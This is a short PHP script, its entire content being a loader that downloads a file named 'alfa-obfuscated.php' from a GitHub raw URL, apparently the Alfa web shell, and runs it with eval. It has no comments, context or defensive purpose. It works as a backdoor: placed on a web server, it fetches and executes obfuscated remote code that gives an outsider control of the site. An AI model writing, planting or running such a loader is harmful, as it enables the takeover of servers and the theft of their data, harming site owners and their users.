<?php
$url = "https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
